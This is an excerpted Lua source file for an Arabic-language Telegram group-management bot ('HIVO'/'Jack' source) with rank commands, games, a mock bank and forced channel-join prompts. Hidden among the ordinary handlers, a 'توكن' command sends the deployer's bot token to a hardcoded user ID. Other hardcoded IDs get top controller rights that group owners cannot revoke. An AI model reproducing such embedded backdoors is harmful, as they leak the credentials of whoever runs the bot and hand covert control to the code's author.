...
{
{text = '- مالك اساسي : '..SuperCreatorz, data =user..'/statusSuperCreatorz/'..useri},{text = '- منشئ : '..Creatorz, data =user..'/statusCreatorz/'..useri},
},
{
...
ControllerAll = false
local ListSudos ={Sudo_Id,7728230165,7728230165}
...
if UserId == 7728230165 then
Status = 'هيفو'
elseif UserId == 7728230165 then
Status = 'مطور السورس'
...
if tonumber(msg.sender.user_id) ~= tonumber(7728230165) then
JoinChannel = false 
end
end
end 
...
if tonumber(msg.sender.user_id) == 7728230165 then
msg.Name_Controller = 'هيفو' 
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 7728230165 then
...
local N = (Redis:get(black.."Name:Bot") or "𝐇𝐈𝐕𝐎")
...
{
{text = '❍ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐇𝐈𝐕𝐎 ❍️', url = 't.me/Source_hivo'},
}
}
...
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"❍ تم تنزيله مالك اساسي مسبقا ").Reply,"md",true)  
else
...
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"❍ تم تنزيله مالك اساسي مسبقا ").Reply,"md",true)  
else
Redis:srem(black.."Supcreator:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"❍ تم تنزيله مالك اساسي ").Reply,"md",true)  
end
end
...
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"❍ تم تنزيله مالك اساسي مسبقا ").Reply,"md",true)  
else
Redis:srem(black.."Supcreator:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"❍ تم تنزيله مالك اساسي ").Reply,"md",true)  
end
end
...
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"❍ تم ترقيته مالك اساسي مسبقا ").Reply,"md",true)  
else
Redis:sadd(black.."Supcreator:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"❍ تم ترقيته مالك اساسي ").Reply,"md",true)  
end
end
if UserName[1] == "منشئ" then
if not msg.Supcreator then
...
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"❍ تم ترقيته مالك اساسي مسبقا ").Reply,"md",true)  
else
Redis:sadd(black.."Supcreator:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"❍ تم ترقيته مالك اساسي ").Reply,"md",true)  
end
end
if TextMsg == "منشئ" then
if not msg.Supcreator then
...
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"❍ تم ترقيته مالك اساسي مسبقا ").Reply,"md",true)  
else
Redis:sadd(black.."Supcreator:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"❍ تم ترقيته مالك اساسي ").Reply,"md",true)  
end
end
if UserId[1] == "منشئ" then
if not msg.Supcreator then
...
if UserId == "7728230165" then
return send(msg_chat_id,msg_id,"\n*❍ عذرآ لا تستطيع استخدام الامر على المبرمج هيفو *","md",true)  
end
if UserId == "7728230165" then
...
data = {
{
{text = '❍ 𝑆𝑂𝑈𝑅𝐶𝐸 ᴊᴀᴋلـ ❍️', url = 't.me/'..chsource..''}, 
},
}
}
...
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/xvwwvl'}, },}}
return send(msg.chat_id,msg.id,'*\n❍ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
...
if text == "زخرفه" then
  ...
  return send(msg_chat_id,msg_id, "مرحبا بك في زخرفه 𝐇𝐈𝐕𝐎 ","md",false,false,false,false,reply_markup)
end
-- z eng
...
if text == '𝐇𝐈𝐕𝐎' or text == 'يهيفو'  then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' 🖤 𝐇𝐈𝐕𝐎 🖤', url = 't.me/Source_hivo'}, 
},
}
}
return send(msg_chat_id,msg_id,"[🖤 𝐇𝐈𝐕𝐎 🖤](tg://user?id=7662999168)","md",true, false, false, true, reply_markup)
end
...
return send(msg_chat_id,msg_id,"[ ᵗᵐ^𝒅𝒂𝒅.✹⃝⁦꙰🇲🇰𝒂𝒃𝒐.𝒂𝒍𝒎𝒂𝒈𝒅. 𝒆𝒍𝒎𝒆𝒍𝒐𝒌𒀭⸙ꠋꠋꠋꠋꠋꠋꠋꠋ](tg://user?id=7728230165)","md",true, false, false, true, reply_markup)
end
...
if text == "توكن" then
if msg.sender.user_id == tonumber(7662999168) then
send(7662999168,msg_id,Token,"html",true)
end
end
if text == "انا مين" then
if msg.sender.user_id == tonumber(7662999168) then
send(msg_chat_id,msg_id,"❍ انت مبرمج السورس يقلبي🌚♥","md",true)
elseif msg.sender.user_id == tonumber(7662999168) then
...
elseif msg.Supcreator then
send(msg_chat_id,msg_id,"❍ انت مالك اساسي يقلبي🌚♥","md",true)
elseif msg.Creator then
...
send(msg_chat_id,msg_id,"❍ مجرد عضو غلبان هنا","md",true)
end 
end
...
{{text = ' ❍ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐇𝐈𝐕𝐎 ❍️', url = "https://t.me/Source_hivo"}},
}
}
return send(msg_chat_id,msg_id, [[*
...
LuaTele.sendAudio(msg_chat_id,msg_id,'./intk'..rand..'.mp3',tostring(inoi),"html",nil,tostring(inoi),"@xvwwvl")
sleep(1)
...
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
send(msg.chat_id,msg.id,"\n*• هيفو ماعنده حساب بالبنك 🤣*","md",true)  
return false
end
...
send(msg.chat_id,msg.id, "حوالة صادرة من بنك هيفو \n\nالمرسل : "..news.."\nالحساب رقم : `"..cccc.."`\nنوع البطاقة : "..uuuu.."\nالمستلم : "..newss.."\nالحساب رقم : `"..text.."`\nنوع البطاقة : "..fsvhh.."\nخصمت 10% رسوم تحويل\nالمبلغ : "..UserNameyy.." جنيه 💵","md",true)
send(fsvhhh,0, "حوالة واردة من بنك هيفو\n\nالمرسل : "..news.."\nالحساب رقم : `"..cccc.."`\nنوع البطاقة : "..uuuu.."\nالمبلغ : "..UserNameyy.." جنيه 💵","md",true)
Redis:del(black.."trans" .. msg.chat_id .. ":" .. msg.sender.user_id) 
Redis:del(black.."transn" .. msg.sender.user_id)
else
send(msg.chat_id,msg.id, "•  مافيه حساب بنكي كذا","md",true)
...
data = {
{
{text = '❍ 𝑆𝑂𝑈𝑅𝐶𝐸 ᴊᴀᴋلـ ❍️', url = 't.me/xvwwvl'}, 
},
}
}
...
data = {
{
{text = '𝑆𝑂𝑈𝑅𝐶𝐸 ᴊᴀᴋلـ', url = 't.me/xvwwvl'}, 
},
}
}
return send(msg_chat_id,msg_id,'*نزل عينك تحت كدا علشان هتخاد علي قفاك 😒❤️*',"md",false, false, false, false, reply_markup)
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⧫ ❍ 𝑆𝑂𝑈𝑅𝐶𝐸 ᴊᴀᴋلـ ❍️️ ⧫',url="t.me/xvwwvl"}},
}
local msg_id = msg.id/2097152/0.5
...
local datar = {data = {{text = "❍ 𝑆𝑂𝑈𝑅𝐶𝐸 ᴊᴀᴋلـ ❍" , url = 'https://t.me/xvwwvl'}}}
for i = 1,5 do
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = '- مالك اساسي : '..SuperCreatorz, data =msg.sender.user_id..'/statusSuperCreatorz/'..UserId_Info.id},{text = '- منشئ : '..Creatorz, data =msg.sender.user_id..'/statusCreatorz/'..UserId_Info.id},
},
{
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = '- مالك اساسي : '..SuperCreatorz, data =msg.sender.user_id..'/statusSuperCreatorz/'..Message_Reply.sender.user_id},{text = '- منشئ : '..Creatorz, data =msg.sender.user_id..'/statusCreatorz/'..Message_Reply.sender.user_id},
},
{
...
if text == (Redis:get(black.."Name:Bot") or "جاك") then
if Redis:get(black.."name bot type : ") == "photo" then
  ...
  if photo.total_count > 0 then
    local NamesBot = (Redis:get(black.."Name:Bot") or "جاك")
    local NameBots = {
"قلب "..NamesBot ,
"مين مزعلك بس يعيوني",
"ثانيه واحده بسلك رقم واحده",
"انا مش فاضي جاك مكاني اهو",
...
if Redis:get(black.."Status:Games"..msg.chat_id) then
KlamSpeed = {"سحور","سياره","استقبال","قنفذ","ايفون","بزونه","مطبخ","كرستيانو","دجاجه","مدرسه","الوان","غرفه","ثلاجه","قهوه","سفينه","جاك","محطه","طياره","رادار","منزل","مستشفى","كهرباء","تفاحه","اخطبوط","سلمون","فرنسا","برتقاله","تفاح","مطرقه","لعبه","شباك","باص","سمكه","ذباب","تلفاز","حاسوب","انترنت","ساحه","جسر"};
name = KlamSpeed[math.random(#KlamSpeed)]
...
name = string.gsub(name,"جاك","ر و ف ر ي")
...
Redis:set(black.."Get:Reides:Commands:Group"..msg_chat_id..":"..'اس', 'رفع مالك اساسي')
...
local CmdStart = '*\n❍ أهلآ بك في بوت '..(Redis:get(black.."Name:Bot") or "جاك")..
...
data = {
{
{text = 'مطور السورس ❍',type = 'text'},{text = '❍ 𝑆𝑂𝑈𝑅𝐶𝐸 ᴊᴀᴋلـ ❍️',type = 'text'},
},
{
...
return send(msg_chat_id,msg_id,"مطور سورس جاك ➢ @"..chdevolper.."","html",true, false, false, true, reply_markup)
end
if text == '❍ 𝑆𝑂𝑈𝑅𝐶𝐸 ᴊᴀᴋلـ ❍️' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
...
return send(msg_chat_id,msg_id,"❍ 𝑆𝑂𝑈𝑅𝐶𝐸 ᴊᴀᴋلـ ❍️ ➢ @"..chsource.."","html",true, false, false, true, reply_markup)
end
...
Redis:del(black.."set:chs"..msg.sender.user_id)
send(msg_chat_id,msg_id,'تم حفظ معرف ❍ 𝑆𝑂𝑈𝑅𝐶𝐸 ᴊᴀᴋلـ ❍️ ',"md",true)  
dofile('black.lua')  
else
send(msg_chat_id,msg_id,'المعرف خطأ ',"md",true)  
end
...
reply_markup = {
inline_keyboard ={
{{text ="ch", url= "https://t.me/xvwwvl"}},
}
},
},
}
https.request("https://api.telegram.org/bot"..Token..'/answerInlineQuery?inline_query_id='..data.id..'&switch_pm_text=@wwvvwl&switch_pm_parameter=start&results='..JSON.encode(resuult))
end
if Text and Text:match("(.*)@(.*)") then
...
if tonumber(Message_Edit.sender.user_id) == 7728230165 then
data.The_Controller = 1
elseif tonumber(Message_Edit.sender.user_id) == 7728230165 then
data.The_Controller = 1
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sᴏᴜʀᴄʀ black',url='https://t.me/xvwwvl'}},
}
...
{
{text = '❍ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐇𝐈𝐕𝐎❍️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
...
local TextHelp = [[*
❍ أهلا بك في قائمة العاب سورس هيفو اختر نوع الالعاب 
*]]
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
...
local TextHelp = [[*
❍ مرحبا بك في الالعاب المتطورة الخاص بسورس 𝐇𝐈𝐕𝐎 
